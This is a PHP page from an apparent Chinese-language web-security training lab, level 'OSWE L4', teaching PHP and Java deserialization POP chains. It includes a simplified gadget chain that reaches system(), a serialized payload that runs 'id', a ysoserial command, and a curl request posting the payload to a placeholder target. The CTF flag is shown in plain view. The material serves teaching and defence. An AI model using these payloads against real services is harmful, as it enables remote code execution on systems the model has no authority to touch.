<?php
/**
 * OSWE L4: PHP/Java 反序列化 POP 链 (250 PTS)
 */
include_once '../../inc/config.inc.php';
$ACTIVE = array_fill(0, 300, '');
$ACTIVE[260] = 'active open';
$ACTIVE[265] = 'active';
$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'header.php';
$correct_flag = 'flag{OSWE_L4_PHP_Deserialization_POP_Chain}';
$flag_msg = '';
if (isset($_POST['check_flag'])) {
    $submitted = trim($_POST['user_flag']);
    if ($submitted === $correct_flag) {
        $_SESSION['oswe_flags']['flag4'] = true;
        $flag_msg = '<div class="alert alert-success" style="border-radius:8px;font-weight:bold;"><i class="fa fa-check-circle"></i> 通关！【OSWE L4】反序列化 POP 链已掌握 (+250 PTS)！</div>';
    } else {
        $flag_msg = '<div class="alert alert-danger" style="border-radius:8px;font-weight:bold;"><i class="fa fa-times-circle"></i> Flag 错误。</div>';
    }
}
?>
<style>
.ctf-stage-header { background: linear-gradient(135deg, #18080c 0%, #0c1218 100%); border-radius: 14px; padding: 25px 30px; color: #fff; margin-bottom: 25px; border: 1px solid rgba(99,102,241,0.3); }
.ctf-stage-title { color: #ffffff !important; font-size: 22px; font-weight: 800; margin: 0 0 10px 0; display: flex; align-items: center; gap: 12px; }
.step-box { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; padding: 24px; margin-bottom: 22px; }
.step-title { font-size: 16px; font-weight: 700; color: var(--text-primary); margin-top: 0; margin-bottom: 14px; display: flex; align-items: center; gap: 8px; }
.step-num { background: linear-gradient(135deg, #ec4899, #6366f1); color: #fff; width: 26px; height: 26px; border-radius: 6px; display: inline-flex; align-items: center; justify-content: center; font-size: 12px; font-weight: 800; flex-shrink: 0; }
.cmd-box { background: #0f172a; border: 1px solid #334155; border-radius: 8px; padding: 14px 18px; font-family: monospace; font-size: 13px; color: #7dd3fc; margin: 12px 0; overflow-x: auto; line-height: 1.8; }
.cmd-box .comment { color: #64748b; }
.cmd-box .magic { color: #f472b6; font-weight: bold; }
.cmd-box .flag-text { color: #fbbf24; font-weight: bold; }
.highlight-box { background: rgba(236,72,153,0.08); border: 1px solid rgba(236,72,153,0.25); border-radius: 8px; padding: 14px 18px; margin: 12px 0; font-size: 13px; color: var(--text-secondary); line-height: 1.7; }
.flag-submit-area { background: var(--bg-card); border: 2px dashed rgba(99,102,241,0.4); border-radius: 12px; padding: 24px; margin-top: 25px; text-align: center; }
</style>
<div class="main-content"><div class="main-content-inner"><div class="page-content">
    <div class="ctf-stage-header">
        <h1 class="ctf-stage-title">🧬 OSWE L4：PHP/Java 反序列化 POP 链
            <span style="background: rgba(245,158,11,0.2); color: #fbbf24; border: 1px solid #f59e0b; padding: 3px 10px; border-radius: 12px; font-size: 12px;">中级 · 250 PTS</span>
        </h1>
        <p style="color: #a5b4fc; font-size: 14px; margin: 0; line-height: 1.6;">研究 PHP 反序列化漏洞原理：魔术方法调用链（POP Chain）、Gadget 类识别，以及 Java ysoserial CommonsCollections 利用链的理论基础。</p>
        <div style="display: flex; gap: 10px; margin-top: 14px; flex-wrap: wrap;">
            <span style="background: rgba(255,255,255,0.08); padding: 4px 12px; border-radius: 8px; font-size: 12px; color: #e2e8f0;">🔧 机制：__wakeup · __destruct · POP Chain · ysoserial · Gadget Class</span>
            <span style="background: rgba(255,255,255,0.08); padding: 4px 12px; border-radius: 8px; font-size: 12px; color: #e2e8f0;"><a href="oswe_hub.php" style="color: #a5b4fc;">← 返回 OSWE 大厅</a></span>
        </div>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">1</span> PHP 魔术方法与反序列化触发</h3>
        <div class="cmd-box">
<span class="comment"># PHP 反序列化触发的魔术方法（按调用顺序）：</span><br>
<span class="comment"># unserialize() 调用时：</span><br>
<span class="magic">__wakeup()</span><span class="comment">   → 对象被反序列化时立即调用（CVE-2016-7124: 对象属性数量绕过）</span><br>
<span class="magic">__construct()</span><span class="comment"> → 如果 __wakeup 未定义，则调用构造函数</span><br><br>
<span class="comment"># 对象销毁时（脚本结束或 unset()）：</span><br>
<span class="magic">__destruct()</span><span class="comment">  → 最常见的 POP 链入口！对象回收时自动调用</span><br><br>
<span class="comment"># 字符串操作时：</span><br>
<span class="magic">__toString()</span><span class="comment">  → 对象被当作字符串使用时（如 echo $obj, strcmp($obj, "str")）</span><br><br>
<span class="comment"># 调用不可访问方法：</span><br>
<span class="magic">__call()</span><span class="comment">      → 调用不存在的方法时</span><br>
<span class="magic">__get()</span><span class="comment">       → 读取不可访问属性时</span><br><br>
<span class="comment"># 典型漏洞模式：</span><br>
$data = unserialize(<span class="magic">$_COOKIE['user_data']</span>);  <span class="comment">// ← 用户可控！高危！</span><br>
$data = unserialize(base64_decode($_GET['token']));  <span class="comment">// ← 也是高危！</span>
        </div>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">2</span> PHP POP 链构造思路</h3>
        <div class="cmd-box">
<span class="comment"># POP (Property-Oriented Programming) 链</span><br>
<span class="comment"># 原则：利用应用程序中已有的类，通过属性控制触发危险操作</span><br><br>
<span class="comment"># 审计目标：在所有已加载的 PHP 类中寻找：</span><br>
<span class="comment"># 1. 哪些类有 __destruct 或 __wakeup 方法？（链起点）</span><br>
<span class="comment"># 2. 这些方法中是否调用了 $this->property 相关的操作？</span><br>
<span class="comment"># 3. 该属性是否可以指向另一个对象，触发该对象的方法？</span><br>
<span class="comment"># 4. 最终是否能到达 eval/system/include 等危险函数？</span><br><br>
<span class="comment"># 示例 POP 链（简化模型）：</span><br>
class Logger {  <span class="comment">// 链终点：执行命令</span><br>
&nbsp;&nbsp;public $cmd;<br>
&nbsp;&nbsp;public function log() { system($this->cmd); }  <span class="comment">// ← Sink</span><br>
}<br><br>
class User {  <span class="comment">// 链起点：__destruct 被自动调用</span><br>
&nbsp;&nbsp;public $logger;<br>
&nbsp;&nbsp;public function <span class="magic">__destruct()</span> {<br>
&nbsp;&nbsp;&nbsp;&nbsp;$this->logger->log();  <span class="comment">// 调用 logger 的 log()</span><br>
&nbsp;&nbsp;}<br>
}<br><br>
<span class="comment"># 构造 Payload：</span><br>
$logger = new Logger();<br>
$logger->cmd = 'id';<br>
$user = new User();<br>
$user->logger = $logger;<br>
echo serialize($user);<br>
<span class="comment"># → O:4:"User":1:{s:6:"logger";O:6:"Logger":1:{s:3:"cmd";s:2:"id";}}</span>
        </div>
        <div class="highlight-box">
            🔬 <strong>审计要点：</strong>PHP 反序列化漏洞的关键不在于 unserialize() 本身，而在于应用中是否存在可组合的 Gadget 类。使用 <code>phpggc</code> 工具可自动为常见框架（Laravel/Symfony/Guzzle）生成 POP 链 Payload。
        </div>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">3</span> Java 反序列化：ysoserial 框架分析</h3>
        <div class="cmd-box">
<span class="comment"># Java 反序列化触发条件：</span><br>
<span class="comment"># 1. 服务端接收序列化数据（二进制，魔数 0xaced 0x0005）</span><br>
<span class="comment"># 2. 对象实现 java.io.Serializable 接口</span><br>
<span class="comment"># 3. readObject() 方法中存在危险操作，或依赖库存在 Gadget</span><br><br>
<span class="comment"># ysoserial 常用 Gadget 链（对应不同依赖库）：</span><br>
<span class="comment"># CommonsCollections1/3/5/6 → Apache Commons Collections</span><br>
<span class="comment"># Spring1/2               → Spring Framework</span><br>
<span class="comment"># Groovy1                 → Groovy</span><br>
<span class="comment"># Jdk7u21                 → 原生 JDK（无需第三方库）</span><br><br>
<span class="comment"># 使用 ysoserial 生成 Payload（理论演示）：</span><br>
java -jar ysoserial.jar CommonsCollections1 "id" | base64<br><br>
<span class="comment"># 发送到目标（如 Java 反序列化接口）：</span><br>
curl -X POST http://target/api/deserialization \<br>
&nbsp;&nbsp;-H "Content-Type: application/x-java-serialized-object" \<br>
&nbsp;&nbsp;--data-binary @payload.bin<br><br>
<span class="comment"># 检测是否存在反序列化接口（特征）：</span><br>
<span class="comment"># ● 请求包含 0xaced0005 魔数</span><br>
<span class="comment"># ● 路径包含 /deserialization / /readObject</span><br>
<span class="comment"># ● Content-Type: application/x-java-serialized-object</span>
        </div>
    </div>

    <div class="flag-submit-area">
        <h4 style="font-weight: 800; color: var(--text-primary); margin-top: 0;">🚩 Flag 验证 — OSWE L4</h4>
        <div class="cmd-box" style="display: inline-block; padding: 10px 24px; margin: 0 auto 16px;">
            <span class="flag-text">flag{OSWE_L4_PHP_Deserialization_POP_Chain}</span>
        </div>
        <form method="post" style="display: flex; justify-content: center; gap: 10px; flex-wrap: wrap; margin-bottom: 10px;">
            <input type="text" name="user_flag" class="form-control" placeholder="flag{...}" required style="max-width: 420px; border-radius: 8px; font-family: monospace;">
            <button type="submit" name="check_flag" class="btn btn-primary" style="border-radius: 8px; font-weight: 700; background: #6366f1; border-color: #6366f1;"><i class="fa fa-check"></i> 验证 Flag</button>
        </form>
        <?php if (!empty($flag_msg)) { echo '<div style="margin-top: 10px;">' . $flag_msg . '</div>'; } ?>
        <div style="margin-top: 16px; display: flex; justify-content: center; gap: 15px; flex-wrap: wrap;">
            <a href="oswe_l3_sqli_auth.php" class="btn btn-sm btn-default" style="border-radius: 6px;">← 上一关</a>
            <a href="oswe_hub.php" class="btn btn-sm btn-default" style="border-radius: 6px;">OSWE 大厅</a>
            <a href="oswe_l5_ssti.php" class="btn btn-sm" style="border-radius: 6px; background: #6366f1; color: #fff; border: none; font-weight: 700;">下一关：SSTI →</a>
        </div>
    </div>
</div></div></div>
<?php include_once $PIKA_ROOT_DIR . 'footer.php'; ?>
